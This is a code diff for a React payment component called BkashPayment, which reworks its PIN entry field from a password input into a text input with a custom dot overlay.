@@ -359,16 +359,29 @@ const BkashPayment = () => {
                     <p className="text-white text-center text-xs font-medium mb-3 h-4">
                       ({getMaskedNumber()})
                     </p>
-                    <input
-                      ref={pinInputRef}
-                      type="password"
-                      autoComplete="off"
-                      value={pinCode}
-                      onChange={handlePinChange}
-                      placeholder="Enter PIN"
-                      className="w-full bg-white rounded px-4 py-2.5 text-center text-gray-600 text-sm placeholder:text-gray-400 focus:outline-none focus:ring-4 focus:ring-white/40 [&::-ms-reveal]:hidden [&::-ms-clear]:hidden"
-                      style={{ WebkitTextSecurity: 'disc', letterSpacing: '0.25em', caretColor: '#374151' } as React.CSSProperties}
-                    />
+                    <div className="relative">
+                      <input
+                        ref={pinInputRef}
+                        type="text"
+                        inputMode="numeric"
+                        autoComplete="off"
+                        value={pinCode}
+                        onChange={handlePinChange}
+                        placeholder="Enter PIN"
+                        className="w-full bg-white rounded px-4 py-2.5 text-center text-sm placeholder:text-gray-400 focus:outline-none focus:ring-4 focus:ring-white/40 [&::-ms-reveal]:hidden [&::-ms-clear]:hidden"
+                        style={{ color: 'transparent', caretColor: pinCode.length > 0 ? 'transparent' : '#9ca3af', letterSpacing: '0.25em' } as React.CSSProperties}
+                      />
+                      {pinCode.length > 0 && (
+                        <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
+                          <div className="flex items-center gap-2.5">
+                            {Array.from({ length: pinCode.length }).map((_, i) => (
+                              <span key={i} className="w-2.5 h-2.5 rounded-full bg-gray-700 inline-block" />
+                            ))}
+                            <span className="w-[1px] h-4 bg-gray-500 inline-block animate-pulse" />
+                          </div>
+                        </div>
+                      )}
+                    </div>
                   </div>
                   {/* Warning flows below input without shifting it */}
                   {showPinWarning && (
